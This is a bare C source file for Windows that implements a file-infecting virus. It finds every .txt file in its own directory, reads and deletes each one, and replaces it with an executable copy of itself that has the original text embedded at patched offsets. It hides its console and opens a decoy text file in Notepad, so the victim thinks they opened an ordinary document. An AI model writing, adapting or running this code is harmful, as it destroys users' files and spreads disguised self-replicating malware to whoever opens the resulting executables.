#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <stdlib.h>

char dir[MAX_PATH];
char exename[MAX_PATH];
char txtname[MAX_PATH];

int infect(char* name)
{
    FILE* fp;
    char fulltxtname[MAX_PATH];
    strcpy_s(fulltxtname, MAX_PATH, dir);
    strcat_s(fulltxtname, MAX_PATH, name);

    fopen_s(&fp, fulltxtname, "rb");
    if (fp == NULL)
    {
        return 1;
    }
    fseek(fp, 0L, SEEK_END);
    long txtsz = ftell(fp);

    fseek(fp, 0, SEEK_SET);
    char* txtbuffer = (char*)malloc(txtsz * sizeof(char));
    fread_s(txtbuffer, txtsz, sizeof(char), txtsz, fp);
    fclose(fp);

    remove(name);

    FILE* selfp;
    fopen_s(&selfp, exename, "rb");
    if (selfp == NULL)
    {
        getch();
        return 1;
    }
    fseek(selfp, 0, SEEK_END);
    long selfsz = ftell(selfp);
    fseek(selfp, 0, SEEK_SET);
    char* selfbuffer = (char*)malloc(selfsz * sizeof(char));
    fread_s(selfbuffer, selfsz, sizeof(char), selfsz, selfp);
    fclose(selfp);

    char name_split[MAX_PATH];
    _splitpath_s(name, NULL, 0, NULL, 0, name_split, MAX_PATH, NULL, 0);

    char newexename[MAX_PATH];
    sprintf_s(newexename, MAX_PATH, "%s%s.exe", dir, name_split);

    fp = NULL;
    fopen_s(&fp, newexename, "wb");
    if (fp == NULL)
    {
        getch();
        return 1;
    }
    fwrite(selfbuffer, sizeof(char), selfsz, fp);
    long txtptr = ftell(fp);
    fwrite(txtbuffer, sizeof(char), txtsz, fp);

    fseek(fp, 0x8e1, SEEK_SET);
    fwrite(&txtptr, sizeof(char), sizeof(long), fp);

    fseek(fp, 0x8ed, SEEK_SET);
    fwrite(&txtsz, sizeof(char), sizeof(char), fp);

    fseek(fp, 0x8fb, SEEK_SET);
    fwrite(&txtsz, sizeof(char), sizeof(char), fp);

    fseek(fp, 0x8ff, SEEK_SET);
    fwrite(&txtsz, sizeof(char), sizeof(char), fp);

    fseek(fp, 0x937, SEEK_SET);
    fwrite(&txtsz, sizeof(char), sizeof(char), fp);

    fclose(fp);

    free(txtbuffer);
    free(selfbuffer);
}

int ListDirectoryContents()
{
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;

    char mask[MAX_PATH];
    strcpy_s(mask, MAX_PATH, dir);
    strcat_s(mask, MAX_PATH, "*.txt");

    if ((hFind = FindFirstFileA(mask, &fdFile)) == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    do
    {
        infect(fdFile.cFileName);
    } while (FindNextFileA(hFind, &fdFile));

    FindClose(hFind);

    return 0;
}

int createTxt()
{
    FILE* selfp;
    fopen_s(&selfp, exename, "rb");
    if (selfp == NULL)
    {
        getch();
        return 1;
    }
    fseek(selfp, (long)0x1fff, SEEK_SET);
    char* selfbuffer = (char*)malloc(4 * sizeof(char));
    fread_s(selfbuffer, 4, sizeof(char), 4, selfp);
    fclose(selfp);

    FILE* p = NULL;
    fopen_s(&p, txtname, "wb");
    if (p == NULL)
    {
        getch();
        return 1;
    }
    fwrite(selfbuffer, sizeof(char), 4, p);
    fclose(p);

    free(selfbuffer);
}



int main(int argc, char* argv[])
{
    GetModuleFileNameA(NULL, &exename, MAX_PATH);

    char name_split[MAX_PATH];
    char dir_split[MAX_PATH];
    char drive_split[10];
    _splitpath_s(exename, drive_split, 10, dir_split, MAX_PATH, name_split, MAX_PATH, NULL, 0);

    sprintf_s(dir, MAX_PATH, "%s%s", drive_split, dir_split);
    sprintf_s(txtname, MAX_PATH, "%s%s.txt", dir, name_split);

    ListDirectoryContents();

    createTxt();

    char command[500];
    strcpy_s(command, 500, "C:\\Windows\\system32\\notepad.exe ");
    strcat_s(command, 500, txtname);
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    system(command);

    remove(txtname);

    return 0;
}